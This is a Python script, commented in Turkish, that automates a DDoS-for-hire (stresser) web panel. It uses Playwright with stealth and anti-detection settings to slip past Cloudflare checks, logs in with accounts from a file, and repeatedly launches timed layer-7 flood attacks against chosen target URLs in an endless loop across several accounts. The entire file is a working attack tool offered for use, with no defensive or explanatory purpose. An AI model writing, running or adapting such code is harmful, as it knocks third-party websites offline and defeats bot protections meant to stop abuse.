import threading
import time
import os
import sys
from rebrowser_playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from playwright_stealth import stealth_sync  # Cloudflare'ı aşmak için kritik

ACCOUNTS_FILE = "accounts.txt"
MAX_CONCURRENT = 2

def load_accounts():
    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"❌ {ACCOUNTS_FILE} bulunamadı! Örnek hesap ile devam ediliyor.")
        return [{"id": "1", "user": "dummy", "pass": "dummy", "url": "https://example.com", "method": "browser-free"}]

    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            parts = line.split(":", 2)
            if len(parts) < 3:
                print(f"⚠️ Geçersiz satır: {line}")
                continue
            user, pwd, rest = parts[0], parts[1], parts[2]
            if ":" in rest:
                url, method = rest.rsplit(":", 1)
            else:
                url = rest
                method = "browser-free"
            accounts.append({
                "id": str(idx),
                "user": user,
                "pass": pwd,
                "url": url,
                "method": method
            })
    return accounts

def attack_worker(account):
    username = account["user"]
    password = account["pass"]
    target_url = account["url"]
    method = account["method"]
    profile_dir = os.path.join(os.getcwd(), f"browser_profiles/profile_{username}")
    os.makedirs(profile_dir, exist_ok=True)

    print(f"[{username}] 🚀 Başlatılıyor | Hedef: {target_url} | Method: {method}")
    consecutive_errors = 0

    while True:
        try:
            with sync_playwright() as p:
                context = p.chromium.launch_persistent_context(
                    user_data_dir=profile_dir,
                    headless=True,
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    args=[
                        "--no-sandbox",
                        "--disable-dev-shm-usage",
                        "--disable-gpu",
                        "--disable-blink-features=AutomationControlled",  # automation detection'ı devre dışı bırak
                        "--disable-features=IsolateOrigins,site-per-process"
                    ],
                    slow_mo=250  # Daha doğal hız
                )
                page = context.new_page()
                
                # ---------- STEALTH EKLENTİSİ (tüm detection'ları gizler) ----------
                stealth_sync(page)

                # ---------- GİRİŞ YAP ----------
                print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                try:
                    # Cloudflare challenge'ı geçmesi için uzun süre ve networkidle
                    response = page.goto("https://l7srv.su/login", timeout=120000, wait_until="networkidle")
                    
                    # Eğer Cloudflare challenge sayfasına yönlendirdiyse, geçmesini bekle
                    if "cf-browser-verification" in page.url or "challenge" in page.url:
                        print(f"[{username}] ⚡ Cloudflare challenge algılandı, geçilmesi bekleniyor...")
                        page.wait_for_timeout(10000)  # 10 saniye bekle, otomatik geçmezse sayfa yenilenir
                        page.reload(wait_until="networkidle")
                        page.wait_for_timeout(5000)

                    if response and response.status >= 400:
                        print(f"[{username}] 🛑 HTTP {response.status} - Engelleniyor olabilir, yeniden deneniyor.")
                        raise Exception(f"HTTP {response.status}")

                    # #username alanını bekle (30 saniye)
                    page.wait_for_selector("#username", timeout=30000)
                    print(f"[{username}] ✅ Sayfa yüklendi, form alanları bulundu.")

                    page.fill("#username", username)
                    page.fill("#password", password)
                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                    page.click("#loginNextBtn")
                    
                    # Dashboard'a yönlendirilme kontrolü
                    page.wait_for_url(lambda url: "/dash" in url, timeout=90000)
                    print(f"[{username}] ✅ Giriş başarılı!")
                    consecutive_errors = 0

                except PlaywrightTimeout as timeout_err:
                    print(f"[{username}] ❌ Zaman aşımı: {timeout_err}")
                    try:
                        print(f"[{username}] 📍 Mevcut URL: {page.url}")
                        # Eğer Cloudflare'de kaldıysa ekstra bekle
                        if "challenge" in page.url:
                            print(f"[{username}] 🔄 Challenge sayfasında, 15 saniye beklenip yeniden deneniyor...")
                            time.sleep(15)
                    except:
                        pass
                    context.close()
                    consecutive_errors += 1
                    wait_time = 60 if consecutive_errors < 3 else 180
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue
                except Exception as login_err:
                    print(f"[{username}] ❌ Giriş hatası: {login_err}")
                    context.close()
                    consecutive_errors += 1
                    wait_time = 60 if consecutive_errors < 3 else 180
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue

                # ---------- STRESS SAYFASI ----------
                print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                try:
                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="networkidle")
                    page.wait_for_timeout(3000)
                    page.wait_for_selector("#layer_7", timeout=20000)
                    page.locator("#layer_7").click()
                    print(f"[{username}] ✅ #layer_7 tıklandı.")
                    consecutive_errors = 0
                except Exception as stress_err:
                    print(f"[{username}] ❌ Stress sayfası hatası: {stress_err}")
                    context.close()
                    consecutive_errors += 1
                    wait_time = 60 if consecutive_errors < 3 else 180
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue

                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                while True:
                    try:
                        page.wait_for_selector("#l7host", timeout=15000)
                        page.fill("#l7host", target_url)
                        page.select_option("#l7method", value=method)
                        time_value = 120 if method == "browser-free" else 200
                        page.fill("#l7time", str(time_value))
                        page.click("#l7btn")
                        print(f"[{username}] 🔥 Saldırı başladı | {time_value} sn")
                        consecutive_errors = 0

                        # Saldırı durumu takibi
                        while True:
                            no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                            if no_attacks.count() > 0 and no_attacks.is_visible():
                                print(f"[{username}] ⏰ Saldırı bitti.")
                                break
                            expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                            if expire_cell.count() > 0:
                                expire_text = expire_cell.text_content().strip()
                                if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                    print(f"[{username}] ⏰ Süre doldu.")
                                    break
                            time.sleep(2)

                        # Sayfayı yenile ve tekrar hazırlan
                        page.reload(wait_until="networkidle")
                        page.wait_for_timeout(3000)
                        page.wait_for_selector("#layer_7", timeout=15000)
                        page.locator("#layer_7").click()
                        page.wait_for_timeout(1000)

                    except Exception as inner_err:
                        print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                        consecutive_errors += 1
                        try:
                            page.reload(wait_until="networkidle")
                            page.wait_for_timeout(5000)
                        except:
                            pass
                        continue

        except Exception as outer_err:
            print(f"[{username}] 💥 Kritik hata: {outer_err}")
            consecutive_errors += 1
            time.sleep(60)

if __name__ == "__main__":
    print("🚀 Başlatılıyor...")
    accounts = load_accounts()
    print(f"✅ {len(accounts)} hesap yüklendi.")

    semaphore = threading.Semaphore(MAX_CONCURRENT)
    def worker_wrapper(acc):
        with semaphore:
            attack_worker(acc)

    threads = []
    for acc in accounts:
        t = threading.Thread(target=worker_wrapper, args=(acc,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(2)

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("🛑 Kapatılıyor.")
        sys.exit(0)
